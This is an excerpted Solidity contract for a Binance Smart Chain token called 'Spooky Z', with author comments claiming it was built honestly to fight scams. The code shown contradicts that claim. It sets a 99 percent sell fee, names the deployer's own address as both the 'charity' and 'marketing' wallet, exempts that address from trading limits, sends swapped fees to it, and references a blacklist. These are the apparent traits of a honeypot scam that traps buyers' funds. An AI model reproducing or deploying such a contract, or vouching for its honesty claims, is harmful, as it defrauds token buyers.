...
//https://t.me/spookyzbsc
//remember once again I built this with full honesty, because I'm sick of the scams circulating in BSC, and all project decisions I will return to the community
...
contract SpookyZ is Context, IBEP20, Ownable {
    ...
    string private constant _name     = "Spooky Z";
    string private constant _symbol   = "SZ";
    ...
    uint256 public  _liquidityFeeSell = 99;
    ...
    constructor () {
        ...
        // 
        _CharityWallet       = 0x893c8fB3e848514F48270F9C4593b97B0B72ACc3;
        _marketingWallet = 0x893c8fB3e848514F48270F9C4593b97B0B72ACc3;
        ...
        _isExcludedFromAntiWhale[address(0x893c8fB3e848514F48270F9C4593b97B0B72ACc3)]            = true; // Deployer
        _isExcludedFromMaxTx[owner()] = true;
        _isExcludedFromMaxTx[address(0x893c8fB3e848514F48270F9C4593b97B0B72ACc3)] = true; // Deployer
...
//Remove from Blacklist 
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        if ( bnbForTeam != 0 ) {
            emit TeamSent(_CharityWallet, bnbForTeam);
            payable(_CharityWallet).transfer(bnbForTeam);
        }
